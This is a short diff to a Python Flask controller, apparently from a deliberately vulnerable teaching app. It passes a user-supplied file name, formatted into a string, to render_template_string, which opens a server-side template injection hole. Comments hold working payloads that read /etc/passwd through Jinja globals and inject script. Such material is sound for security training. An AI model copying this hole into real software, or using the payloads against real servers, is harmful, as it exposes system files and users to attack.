@@ -1,0 +1,6 @@
+#src/controllers/homeController.py
+#Exploitation: {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+#Exploitation: {{ '<script>alert(3)</script>' | safe }}
+template = "File '%s' couldn't have been opened. " % file_name
+log_config.logger.error("User failed to open: %s" % bleach.clean(file_name), extra={'ip_address': request.remote_addr})
+return render_template_string(template)
